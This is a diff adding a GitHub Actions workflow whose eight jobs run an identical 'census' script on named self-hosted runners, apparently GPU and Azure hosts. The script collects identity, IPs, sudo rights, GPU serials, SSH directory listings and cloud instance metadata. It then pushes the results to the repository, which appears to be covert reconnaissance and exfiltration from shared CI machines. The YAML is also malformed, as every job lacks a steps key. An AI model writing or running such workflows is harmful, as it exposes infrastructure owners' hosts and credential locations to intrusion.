@@ -1,0 +1,148 @@
+name: ul6599-queue
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  p0:
+    runs-on: [self-hosted, t1946107x61]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL t1946107x61 $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_t1946107x61.txt
+          git add ul/res_t1946107x61.txt && git commit -qm "res t1946107x61" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p1:
+    runs-on: [self-hosted, t1946107x76]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL t1946107x76 $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_t1946107x76.txt
+          git add ul/res_t1946107x76.txt && git commit -qm "res t1946107x76" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p2:
+    runs-on: [self-hosted, a100itn1]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL a100itn1 $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_a100itn1.txt
+          git add ul/res_a100itn1.txt && git commit -qm "res a100itn1" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p3:
+    runs-on: [self-hosted, t19i52947-eus-h]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL t19i52947-eus-h $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_t19i52947-eus-h.txt
+          git add ul/res_t19i52947-eus-h.txt && git commit -qm "res t19i52947-eus-h" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p4:
+    runs-on: [self-hosted, azresid]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL azresid $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_azresid.txt
+          git add ul/res_azresid.txt && git commit -qm "res azresid" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p5:
+    runs-on: [self-hosted, i72364]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL i72364 $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_i72364.txt
+          git add ul/res_i72364.txt && git commit -qm "res i72364" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p6:
+    runs-on: [self-hosted, hk-az]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL hk-az $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_hk-az.txt
+          git add ul/res_hk-az.txt && git commit -qm "res hk-az" && git push origin HEAD:main || true
+          cat /tmp/res.txt
+
+  p7:
+    runs-on: [self-hosted, h100]
+    timeout-minutes: 8
+      - name: census
+        run: |
+          {
+            echo "LABEL h100 $(date -u +%FT%TZ)"; id; hostname; hostname -I
+            cat /proc/1/cgroup | head -3; sudo -n -l 2>&1 | head -5
+            nvidia-smi -L
+            nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,utilization.gpu --format=csv,noheader
+            ls -la /root/.ssh /home/*/.ssh 2>/dev/null
+            curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+          } > /tmp/res.txt 2>&1
+          git config user.email ul@local; git config user.name ul
+          mkdir -p ul && cp /tmp/res.txt ul/res_h100.txt
+          git add ul/res_h100.txt && git commit -qm "res h100" && git push origin HEAD:main || true
+          cat /tmp/res.txt
